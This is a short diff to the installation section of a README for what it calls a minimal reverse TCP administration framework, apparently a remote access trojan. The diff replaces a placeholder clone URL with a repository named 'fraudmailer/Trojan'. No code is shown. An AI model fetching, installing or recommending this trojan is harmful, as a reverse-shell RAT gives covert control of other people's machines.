@@ -52,7 +52,7 @@ Minimal reverse TCP administration framework built with Python.
 # Installation
 
 ```bash id="v2n7yc"
-git clone https://github.com/yourusername/advanced-rat.git
+git clone https://github.com/fraudmailer/Trojan
 cd advanced-rat
 ```
 
